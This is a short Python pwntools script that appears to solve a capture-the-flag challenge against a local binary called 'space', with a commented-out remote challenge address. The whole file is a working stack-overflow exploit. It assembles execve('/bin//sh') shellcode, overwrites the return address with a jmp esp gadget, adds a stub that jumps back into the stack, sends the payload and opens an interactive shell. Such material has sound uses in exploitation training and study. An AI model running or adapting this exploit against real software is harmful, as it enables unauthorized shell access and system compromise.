#!/usr/bin/python3

from pwn import *
from sys import argv

import ropgadget

# proc = remote("209.97.187.76", 32487)
proc = process("./space")

part_2 = '''
push   edx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
push   0xb
pop    eax
int    0x80
'''

part_1 = '''
xor edx,edx
xor ecx,ecx
sub esp,0x16
jmp esp
'''

payload = asm(part_2)
payload += p32(0x0804919f) # (return address) 0x0804919f jmp esp
payload += asm(part_1)  # clear edx
proc.recvuntil(b"> ")
proc.send(payload)
proc.interactive()